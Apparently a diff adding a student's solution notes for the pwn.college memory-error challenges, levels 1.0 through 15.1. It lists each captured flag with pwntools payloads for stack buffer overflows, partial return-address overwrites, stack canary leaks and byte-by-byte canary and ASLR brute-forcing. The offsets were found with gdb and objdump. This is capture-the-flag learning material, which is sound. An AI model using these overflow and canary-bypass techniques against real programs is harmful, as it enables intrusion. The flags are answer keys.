@@ -1,0 +1,342 @@
+1.0. pwn.college{k4OC_lMQPAq-ey-OEFacwaulrHS.QX5gjMsITNxUzW}
+
+aaaaaaaaaaaaaaaaaaaa\xa6\x24 -> this is the last 2 bytes of win
+
+1.1. pwn.college{8q19JHxCiNRdzCvGwHO_IkVYR0Z.QXwkjMsITNxUzW}
+
+size = 100
+payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+2.0. pwn.college{g17gu7W8e9x6VaYf9DJSJhx0WrX.QXxkjMsITNxUzW}
+
+1. find address of buf -> use gdb, break at first malloc, get value in $rax
+2. find address of win variable -> break after calloc for win var, get value in $rax
+3. subtract buf from win, this is the buffer size 
+4. payload = all a's for the size of 3 then send the last value in the win address 
+
+info(p.readrepeat(1))
+p.send(b'400')
+info(p.readrepeat(1))
+p.send(b'a'*369 + b'\x20')
+info(p.readrepeat(1))
+
+2.1. pwn.college{g589b55PbR8t6MwhdjP5GSRYW6d.QXykjMsITNxUzW}
+
+malloc buf -> 1f57 0x55555555a6b0
+calloc win -> 1f8b 0x55555555a820
+
+info(p.readrepeat(1))
+p.send(b'400')
+info(p.readrepeat(1))
+p.send(b'a'*369 + b'\x20')
+info(p.readrepeat(1))
+
+3.0. pwn.college{cr5cjkay8X85jxjhvra5Mz8GmiT.QXzkjMsITNxUzW}
+
+objdump -M intel -d /challenge/$HOSTNAME | grep win -> find the address of the win function
+
+info(p.readrepeat(1))
+p.send(b'150')
+info(p.readrepeat(1))
+p.send(b'a'*137 + b'\x06\x21')
+info(p.readrepeat(1))
+
+3.1. pwn.college{0X10tACLs6WQ8ZgY9KsRbQK39n5.QX0kjMsITNxUzW}
+
+1. use pwn.cyclic to find the return byte size
+2. send byte size with addr of win at the end (found using objdump)
+
+import pwn; pwn.cyclic(400)
+pwn.cyclic_find()
+
+info(p.readrepeat(1))
+p.send(b'100')
+info(p.readrepeat(1))
+p.send(b'a'*41 + b'\x10\x1a')
+info(p.readrepeat(1))
+
+4.0. pwn.college{AiqlX34mNXPG0Lcwn8szjtD8FPE.QX1kjMsITNxUzW}
+
+info(p.readrepeat(1))
+p.send(b'-1')
+info(p.readrepeat(1))
+p.send(b'a'*89 + b'\x62\x20')
+info(p.readrepeat(1))
+
+4.1. pwn.college{Y0yvfQ9t3Tf0N12WuMAUkp2M2fo.QX2kjMsITNxUzW}
+
+info(p.readrepeat(1))
+p.send(b'-1')
+info(p.readrepeat(1))
+p.send(b'a'*121 + b'\xe9\x16')
+info(p.readrepeat(1))
+
+5.0. pwn.college{A_X3wGDUv6HGVs7ifj8F6A1-ONg.QX3kjMsITNxUzW}
+
+info(p.readrepeat(1))
+p.send(b'2'+ b'\n' + b'2147483648' + b'\n'+ b'a'*56 + b'\xcd\x17\x40')
+info(p.readrepeat(1))
+
+5.1. pwn.college{ABS7I3SAIp87Yi9_BoYaygCyBaM.QX4kjMsITNxUzW}
+
+info(p.readrepeat(1))
+p.send(b'2'+ b'\n' + b'2147483648' + b'\n'+ b'a'*152 + b'\x7e\x13\x40')
+info(p.readrepeat(1))
+
+6.0. pwn.college{8wMFuuUhbaFCA5XZWR9_ueaX63F.QX5kjMsITNxUzW}
+
+info(p.readrepeat(1))
+p.send(b'400'+ b'\n' + b'a'*56 + b'\x1e\x18\x40') 
+info(p.readrepeat(1))
+
+6.1. pwn.college{IPWR2ip64u-k_ZKlJZ89fR8Bqc9.QXwAzMsITNxUzW}
+
+info(p.readrepeat(1))
+p.send(b'400'+ b'\n' + b'a'*152 + b'\x2b\x1e\x40')
+info(p.readrepeat(1))
+
+7.0. pwn.college{QloeFY4-D2i3pHJ44WNn0AsFgE6.QXxAzMsITNxUzW}
+
+must repeat until you get the correct second byte
+
+info(p.readrepeat(1))
+p.send(b'400'+ b'\n' + b'a'*72 + b'\x70\x5f')
+info(p.readrepeat(1))
+
+7.1. pwn.college{sGhSjohEGGM4-4PZPMTnRVqUM1r.QXyAzMsITNxUzW}
+
+info(p.readrepeat(1))
+p.send(b'400'+ b'\n' + b'a'*120 + b'\xc4\x13')
+info(p.readrepeat(1))
+
+aaaaba\0acaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaa\0uaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad
+
+8.0. pwn.college{wu20er_o8dMk1wkmTtLfptjqc9h.QXzAzMsITNxUzW}
+
+echo -ne '400\n\0aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab' | gdb -ex=r /challenge/$HOSTNAME
+
+m.gdb 
+    r
+    x/s $rsp
+
+info(p.readrepeat(1))
+p.sendline(b'400')
+info(p.readrepeat(1))
+p.send(b'\0' + b'a'*87 + b'\x5c\x1f')
+info(p.readrepeat(1))
+
+8.1. pwn.college{0wyjVA2N6N_O7aKY0BfxYFCCZ-f.QX0AzMsITNxUzW}
+
+info(p.readrepeat(1))
+p.sendline(b'400')
+info(p.readrepeat(1))
+p.send(b'\0' + b'a'*151 + b'\x77\x1e')
+info(p.readrepeat(1))
+
+9.0. pwn.college{46eSpdX0n9w-fZzkICQiNNydGQO.QX1AzMsITNxUzW}
+
+1. find 152 and 128 values
+2. find 128
+    gdb, set breakpoint before the read
+    display $rax, first address is the buffer, second address is n 
+    subtract them to get 128
+3. find 152
+    gdb, do same breakpoint 
+    second address is what we want 
+    p/d $rbp + 8 - secondaddr to ger 152
+
+info(p.readrepeat(1))
+p.sendline(b'154')
+info(p.readrepeat(1))
+p.send(b'a'*128 + b'\x97' + b'\x2c\x17')
+info(p.readrepeat(1))
+
+9.1. pwn.college{Q3MkBzpj2aUNOSOkGpwi3qpZBov.QX2AzMsITNxUzW}
+
+info(p.readrepeat(1))
+p.sendline(b'138')
+info(p.readrepeat(1))
+p.send(b'a'*112 + b'\x87' + b'\x53\x20')
+info(p.readrepeat(1))
+
+10.0. pwn.college{chPkkJoVxbI7HTg3VjtguEUgRHw.QX3AzMsITNxUzW}
+
+info(p.readrepeat(1))
+p.sendline(b'200')
+info(p.readrepeat(1))
+p.send(b'a'*103) -> get 103 bc it is the size of the buffer in ida
+info(p.readrepeat(1))
+
+10.1. pwn.college{IRyNuXyKKI4QxkEsTJkmKNjOw4a.QX4AzMsITNxUzW}
+
+info(p.readrepeat(1))
+p.sendline(b'200')
+info(p.readrepeat(1))
+p.send(b'a'*113)
+info(p.readrepeat(1))
+
+11.0. pwn.college{40ZHPn0b7flnGpje1edG95HCsC7.QX5AzMsITNxUzW}
+
+info(p.readrepeat(1))
+p.sendline(b'20480')
+info(p.readrepeat(1))
+p.send(b'a'*(0x5000)) -> look in ida for this value, for loop that mmaps a bunch of times
+info(p.readrepeat(1))
+
+11.1. pwn.college{Eg8e0k1Mj0kvNzVY8u9oKCd7czN.QXwEzMsITNxUzW}
+
+info(p.readrepeat(1))
+p.sendline(b'28672')
+info(p.readrepeat(1))
+p.send(b'a'*(0x7000))
+info(p.readrepeat(1))
+
+12.0. pwn.college{s3gYHBhBXwEUOHS1WJqtB0DTkkk.QXxEzMsITNxUzW}
+
+info(p.readrepeat(1))
+p.sendline(b'200')
+info(p.readrepeat(1))
+p.send(b'REPEAT' + b'a'*(67)) -> get value of 64+3, 64 is buffer size in ida
+info(p.readuntil(b"You said: REPEAT" + b"a"*67))
+ba = p.readlineb()
+ba = ba[:-7]
+can = flat(ba, endian='little')
+info(p.readrepeat(1))
+p.sendline(b'200')
+info(p.readrepeat(1))
+p.send(b'a'*(72) + b'\x00' + can + b'b'*8 + b'\x29\x20') -> value of 72 = 64 + 8
+info(p.readrepeat(1))
+
+0x7fffffffd240
+
+break before read, get value in rsi 2689
+break before canary thing get $rax 2137
+
+12.1. pwn.college{UN69jwAtKXR91Z63uVq8-on2Yr4.QXyEzMsITNxUzW}
+
+info(p.readrepeat(1))
+p.sendline(b'200')
+info(p.readrepeat(1))
+p.send(b'REPEAT' + b'a'*(35)) -> found 31 using gdb and counting the byte number, add 1 to this to fill the adress then add 3 to that to overwrite the 0x00 byte in the canary
+info(p.readuntil(b"You said: REPEAT" + b"a"*(35)))
+ba = p.readlineb()
+print(ba)
+ba = ba[:-7]
+can = flat(ba, endian='little')
+info(p.readrepeat(1))
+p.sendline(b'200')
+info(p.readrepeat(1))
+p.send(b'a'*(40) + b'\x00' + can  + b'b'*8 + b'\x59\x21') -> get 40 because it is 31+1 to fill the address then 32+8 to get to the canary address 
+info(p.readrepeat(1))
+
+
+13.0. pwn.college{43lu_NGIaqeebSh5Uo-iMrY3gS6.QXzEzMsITNxUzW}
+
+/challenge/$HOSTNAME
+100
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+number of a's 
+in gdb 
+break before read, get rsi 
+break before open, get rdi
+
+0x55555555710c 0x7fffffffd140
+
+13.1. pwn.college{IzyGAykoeowjF5qxY0VeUHHdyWz.QX0EzMsITNxUzW}
+
+
+# run this until the flag comes out
+for i in range(300):
+    with process([f"/challenge/{os.getenv('HOSTNAME')}"]) as p:
+        info(p.readrepeat(1))
+        p.sendline(b'400')
+        info(p.readrepeat(1))
+        p.send(b'a'*(i))
+        info(p.readrepeat(1))
+
+
+14.0. pwn.college{kdqwSDY1FjdW4UTXYl7XxH0vU_s.QX1EzMsITNxUzW}
+
+p.readrepeat(1)
+p.sendline(b'500') 
+p.readrepeat(1)
+p.send(b'REPEAT' + b'a'*(99)) -> find this using gdb, break at the start of challenge(), search stack using x/x $rsp+0x?? to find canary then subtract from the buffer location (break at read), then subtract 5 (6-1) for REPEAT from this number
+p.readuntil(b"You said: REPEAT" + b"a"*(99))
+ba = p.readlineb()
+print(ba)
+ba = ba[:-5]
+can = flat(ba, endian='little')
+p.readrepeat(1)
+p.sendline(b'500')
+p.readrepeat(1)
+p.send(b'a'*(376) + b'\x00' + can  + b'b'*8 + b'\x1a\x20') -> 371 is the buffer size, plus the rest of the qword, leave the rest
+info(p.readrepeat(1))
+
+14.1. pwn.college{MA70HZ64-nFNXNdYRi1Sk4CS93M.QX2EzMsITNxUzW}
+
+# 0xbf54e15434e01100, x/gx $rsp+0x0228=0x7fffffffd178, x/gx $rsi=0x7fffffffd0a0
+
+info(p.readrepeat(1))
+p.sendline(b'1000')
+info(p.readrepeat(1))
+p.send(b'REPEAT' + b'a'*(211))
+info(p.readuntil(b"You said: REPEAT" + b"a"*(211)))
+ba = p.readlineb()
+print(ba)
+ba = ba[:-5]
+print(ba)
+can = flat(ba, endian='little')
+info(p.readrepeat(1))
+p.sendline(b'1000')
+info(p.readrepeat(1))
+p.send(b'a'*(488) + b'\x00' + can  + b'b'*8 + b'\x86\x1c')
+info(p.readrepeat(1))
+
+
+15.0. pwn.college{IAeg48HpxtSjn1C__ahFcBZpF3d.QX3EzMsITNxUzW}
+
+for i in range( 256 ): 
+    with remote('localhost', 1337) as p:
+        print(hex(i))
+        payload = b'a'*(88)+b'\0'
+        payload = payload + p8(0xa1) + p8(0xbe) + p8(0xb2) + p8(0x4a) + p8(0xae) + p8(0xb5) + p8(0x7f) + b'b'*8 + b'\x77' + p8(0x09+(16*i))
+        p.readrepeat(1)
+        p.sendline(b'1000')
+        p.readrepeat(1)
+        p.send(payload)
+        p.readuntil(b'Goodbye!')
+        info(p.readrepeat(1))
+        # if b"*** stack" in s: 
+        #     print("smashing")
+        # else: 
+        #     break
+        # 61 a1 be b2 4a ae b5 7f
+
+
+15.1. pwn.college{Ads6O0dSittw3UjSW1dozp_tVEO.QX4EzMsITNxUzW}
+
+# part 1
+for n in range(8):
+    for i in range( 256 ): 
+        with remote('localhost', 1337) as p:
+            print(f'n={n}, i ={i}')
+            p.readrepeat(1)
+            p.sendline(b'1000')
+            p.readrepeat(1)
+            p.send(payload + p8(i))
+            s = p.readrepeat(1)
+            info(s)
+
+# part 2
+for i in range(16): 
+    with remote('localhost', 1337) as p:
+            # print(f'n={n}, i ={i}')
+            payload = b'a'*24 + b'\0' + b'\x83' + b'\x3a' + b'\xac' +b'\xcb' + b'\xa0' + b'\xb4' + b'\xc7' + b'b'*8 + b'\x73' + p8(0x07+(16*i))
+            info(p.readrepeat(1))
+            p.sendline(b'1000')
+            info(p.readrepeat(1))
+            p.send(payload)
+            s = p.readrepeat(1)
+            info(s)
+
